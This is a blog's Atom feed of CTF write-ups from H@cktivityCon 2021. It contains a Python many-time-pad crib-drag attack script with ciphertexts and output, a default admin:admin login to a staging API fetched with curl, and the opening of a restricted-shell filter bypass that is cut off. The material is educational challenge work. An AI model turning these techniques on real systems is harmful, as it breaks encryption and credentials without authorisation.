<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-09-18T09:39:00+10:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">N1TP - H@acktivityCon 2021</title><link href="https://jayngng.github.io/blog/n1tp-hacktivitycon-2021/" rel="alternate" type="text/html" title="N1TP - H@acktivityCon 2021" /><published>2021-09-18T18:37:02+10:00</published><updated>2021-09-18T18:37:02+10:00</updated><id>https://jayngng.github.io/blog/n1tp---hacktivitycon-2021</id><content type="html" xml:base="https://jayngng.github.io/blog/n1tp-hacktivitycon-2021/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @JohnHammond#6971&lt;/p&gt;

&lt;p&gt;Nina found some new encryption scheme that she apparently thinks is really cool. She’s annoying but she found a flag or something, can you deal with her?&lt;/p&gt;

&lt;p&gt;Press the Start button on the top-right to begin this challenge.
Connect with:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc challenge.ctf.games 31921
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us connect to the challenge.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 31921
NINA: Hello! I found a flag, look!
      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
NINA: But I encrypted it with a very special nonce, the same length as 
      the flag! I heard people say this encryption method is unbreakable!
      I&lt;span class=&quot;s1&quot;&gt;&apos;ll even let you encrypt something to prove it!! What should we encrypt?
&amp;gt; Hello NINAAA
NINA: Ta-daaa!! I think this is called a &apos;&lt;/span&gt;one&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;pad&lt;span class=&quot;s1&quot;&gt;&apos; or something?
      5d599ac45acaa3ed7eaf0ffe69c37e566ed44a19cf4c0ae43d5ec50d609b3ac513231bd9c8f2
NINA: Isn&apos;&lt;/span&gt;t that cool!?! Want to see it again? 
      Sorry, I forget already &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; what was it you wanted to see again?
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; THIS IS ME ...
NINA: Ta-daaa!! I think this is called a &lt;span class=&quot;s1&quot;&gt;&apos;one&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;time&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;pad&apos;&lt;/span&gt; or something?
      4174bffb15a3be847dab6e910f88467248a72419d22d06e05515874f5bf33ddf7d2b09b8cdd2
NINA: Isn&lt;span class=&quot;s1&quot;&gt;&apos;t that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
&amp;gt; HOW ARE YOU DOING
NINA: Ta-daaa!! I think this is called a &apos;&lt;/span&gt;one&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;pad&lt;span class=&quot;s1&quot;&gt;&apos; or something?
      5d73a18874b8a88469a11b9f65e95b7446bc4b07a14c19e05562e6342fff3bc5132512d7d7b7
NINA: Isn&apos;&lt;/span&gt;t that cool!?! Want to see it again? 
      Sorry, I forget already &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; what was it you wanted to see again?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the very first line, Nina sent us a encrypted flag using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;one&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;time&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pad&lt;/code&gt;. Now everytime we sent a message, Nina takes our message, encrypts it and sends it back to us.&lt;/p&gt;

&lt;p&gt;Our theory is Nina reuses a same key for message encryption. This is also called &lt;strong&gt;Many Time Pad Attack&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Source: &lt;a href=&quot;http://travisdazell.blogspot.com/2012/11/many-time-pad-attack-crib-drag.html&quot;&gt;Many Time Pad Attack.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;To attack the encryption, we follow the below steps:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Guess a word that might appear in one of the messages&lt;/li&gt;
  &lt;li&gt;Encode the word from step 1 to a hex string&lt;/li&gt;
  &lt;li&gt;XOR the two cipher-text messages&lt;/li&gt;
  &lt;li&gt;XOR the hex string from step 2 at each position of the XOR of the two cipher-texts (from step 3)&lt;/li&gt;
  &lt;li&gt;When the result from step 4 is readable text, we guess the English word and expand our crib search.
     + If the result is not readable text, we try an XOR of the crib word at the next position.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; script can automatically do the job. (I couldn’t remember where the source is).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python &lt;/span&gt;
import string
import collections
import sets

&lt;span class=&quot;c&quot;&gt;# XORs two string&lt;/span&gt;
def strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a, b&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:     &lt;span class=&quot;c&quot;&gt;# xor two strings (trims the longer input)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;chr&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ^ ord&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x, y&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;zip&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;a, b&lt;span class=&quot;o&quot;&gt;)])&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 10 unknown ciphertexts (in hex format), all encrpyted with the same key&lt;/span&gt;
c1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1a3a20741ca737cb76cb0e33909bb16bc0dd5cd150c14babcf505f6473b6615f8bd0963a04c4&quot;&lt;/span&gt;
c2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;23343e651ca7308a718e0260d981fe7e87df5ad06b8044abcf455c2820bd6d118384c63710852a3238651cb5348a62&quot;&lt;/span&gt;
c3 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3a332b7259f3319825c312339f83f06d87d515de6a8052be8650592a67f362109084df2f43cb24352f204cbf2bcb62c71d76d982f42aded340cd27c649be880459646eb6611bc2cdc27b17ca6d283b6251ba2ccb63c11933918ef261d3d543d664cf4b&quot;&lt;/span&gt;
c4 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;34343b204fbb379e69ca4b7d969bb178c2c946da27d44dbacf4f553d20b56b0dc2cbd83e43d124362b204cb23ccb6bc70572&quot;&lt;/span&gt;
c5 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;272e3d741cb4319d608e0676d99bf96f87da59de60ca50ac9b04572d76b624128784c2330685&quot;&lt;/span&gt;
c6 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;247b396152a7788a25c807729e86b17dc6d2419f668043b38e43596477b26a0bc2c5963d0fc4&quot;&lt;/span&gt;
c7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;25352b7755b22d8d6bcc0f60958efb61d0d95ed561ce41ac84485e2573a97c1c9adede3506d2&quot;&lt;/span&gt;
c8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;247b2f6d1ca4398271c70574d989fe7887c85dda27c649be884d10256df3731e8bd0df350485&quot;&lt;/span&gt;
c9 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3a332f741ca4399825c71f338080e42ad0dd5bcb62c405ab8004432165f3651883cdd82c0bc4&quot;&lt;/span&gt;
c10 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;047b286f4eb43d9f25cf07619c8ef573ee9c53d075c740abcf455c3665b26006ab84d03411c2&quot;&lt;/span&gt;


ciphers &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c1, c2, c3, c4, c5, c6, c7, c8, c9, c10]
&lt;span class=&quot;c&quot;&gt;# The target ciphertext we want to crack&lt;/span&gt;
target_cipher &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2b372f6747ea6adc33cd0f71ced9f039c3d803dd36c610eddc16007d63b73d1cd2c5876a01d8&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# To store the final key&lt;/span&gt;
final_key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;None]&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;150
&lt;span class=&quot;c&quot;&gt;# To store the positions we know are broken&lt;/span&gt;
known_key_positions &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# For each ciphertext&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;current_index, ciphertext &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

	counter &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; collections.Counter&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;# for each other ciphertext&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index, ciphertext2 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;current_index &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; index: &lt;span class=&quot;c&quot;&gt;# don&apos;t xor a ciphertext with itself&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;indexOfChar, char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphertext.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ciphertext2.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;: &lt;span class=&quot;c&quot;&gt;# Xor the two ciphertexts&lt;/span&gt;
				&lt;span class=&quot;c&quot;&gt;# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&apos;t know which one)&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;string.printable and char.isalpha&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;: counter[indexOfChar] +&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1 &lt;span class=&quot;c&quot;&gt;# Increment the counter at this index&lt;/span&gt;
	knownSpaceIndexes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;

	&lt;span class=&quot;c&quot;&gt;# Loop through all positions where a space character was possible in the current_index cipher&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ind, val &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;counter.items&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
		&lt;span class=&quot;c&quot;&gt;# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;val &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 7: knownSpaceIndexes.append&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ind&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;#print knownSpaceIndexes # Shows all the positions where we now know the key!&lt;/span&gt;

	&lt;span class=&quot;c&quot;&gt;# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!&lt;/span&gt;
	xor_with_spaces &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ciphertext.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;150&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;knownSpaceIndexes:
		&lt;span class=&quot;c&quot;&gt;# Store the key&apos;s value at the correct position&lt;/span&gt;
		final_key[index] &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; xor_with_spaces[index].encode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;c&quot;&gt;# Record that we known the key at this position&lt;/span&gt;
		known_key_positions.add&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;index&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Construct a hex key from the currently known key, adding in &apos;00&apos; hex chars where we do not know (to make a complete hex string)&lt;/span&gt;
final_key_hex &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;val &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;val is not None &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;00&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;val &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;final_key]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Xor the currently known key with the target cipher&lt;/span&gt;
output &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;target_cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,final_key_hex.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Print the output, printing a * if that character is not known yet&lt;/span&gt;
print &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;.join&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;index &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;known_key_positions &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;*&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;index, char &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;enumerate&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;output&lt;span class=&quot;o&quot;&gt;)])&lt;/span&gt;

&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
Manual step
&apos;&apos;&apos;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# From the output this prints, we can manually complete the target plaintext from:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The secuet-mes*age*is: Wh** usi|g **str*am cipher, nev***use th* k*y *ore than onc*&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# to:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The secret message is: When using a stream cipher, never use the key more than once&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# We then confirm this is correct by producing the key from this, and decrpyting all the other messages to ensure they make grammatical sense&lt;/span&gt;
target_plaintext &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b76a3dd6b1f523209cd9c0a11b}&quot;&lt;/span&gt;
print target_plaintext
key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;target_cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,target_plaintext&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cipher &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;ciphers:
	print strxor&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cipher.decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hex&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By running the script, we can partially obtain the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python2 attack.py                                                                                                                                                                     1 ⨯
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;l&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;g&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;927&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;cdb7&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;a3&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;d6b1f5&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;209cd9c0&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;b&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Keep rotating the cipher texts (c1,c2,c3,c4,c5 …). After a few times, we should be able to recover all parts of the flag.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="cryptography" /><category term="ctf" /><category term="challenge" /><summary type="html">Description</summary></entry><entry><title type="html">Swaggy - H@acktivityCon 2021</title><link href="https://jayngng.github.io/blog/swaggy-hacktivitycon-2021/" rel="alternate" type="text/html" title="Swaggy - H@acktivityCon 2021" /><published>2021-09-17T18:18:05+10:00</published><updated>2021-09-17T18:18:05+10:00</updated><id>https://jayngng.github.io/blog/swaggy---hacktivitycon-2021</id><content type="html" xml:base="https://jayngng.github.io/blog/swaggy-hacktivitycon-2021/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @congon4tor#2334&lt;/p&gt;

&lt;p&gt;This API documentation has all the swag&lt;/p&gt;

&lt;p&gt;Press the Start button on the top-right to begin this challenge.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Connect with:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    http://challenge.ctf.games:32286
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Navigating to the website, there are two available servers:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;API&lt;/code&gt; … (unavailable).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; …&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Swaggy/servers.png&quot; title=&quot;Swaggy/servers.png&quot; alt=&quot;Swaggy/servers.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;We are particularly interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; one.&lt;/p&gt;

&lt;p&gt;To test the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Staging-API&lt;/code&gt; server and obtain the flag, we need to first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorize&lt;/code&gt;.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorize&lt;/code&gt; → Try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; credentials.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/Swaggy/authorize.png&quot; title=&quot;Swaggy/authorize.png&quot; alt=&quot;Swaggy/authorize.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;After successfully logged in as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; user. We then execute the following command to retain the flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;GET&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;s1&quot;&gt;&apos;http://staging-api.congon4tor.com:7777/flag&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;accept: application/json&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Authorization: Basic YWRtaW46YWRtaW4=&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;flag{e04f962[*REDACTED*]bf1dcdd3}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="web" /><category term="challenge" /><summary type="html">Description</summary></entry><entry><title type="html">Bad Words - H@cktivityCon 2021</title><link href="https://jayngng.github.io/blog/bad-words-hcktivitycon-2021-ctf/" rel="alternate" type="text/html" title="Bad Words - H@cktivityCon 2021" /><published>2021-09-16T17:57:21+10:00</published><updated>2021-09-16T17:57:21+10:00</updated><id>https://jayngng.github.io/blog/bad-words---hcktivitycon-2021-ctf</id><content type="html" xml:base="https://jayngng.github.io/blog/bad-words-hcktivitycon-2021-ctf/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; @JohnHammond#6971&lt;/p&gt;

&lt;p&gt;You look questionable… if you don’t have anything good to say, don’t say anything at all!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Connect with:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc challenge.ctf.games 32559
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us connect to the challenge.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc challenge.ctf.games 32559
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;You said a bad word, &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;
user@host:/home/user&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the output, we notice that every ‘normal’ bash command is a bad word. Now, we need to bypass this.&lt;/p&gt;

&lt;p&gt;There are heaps of ways to achieve the goal. That said, we can use the following format …&lt;/p&gt;

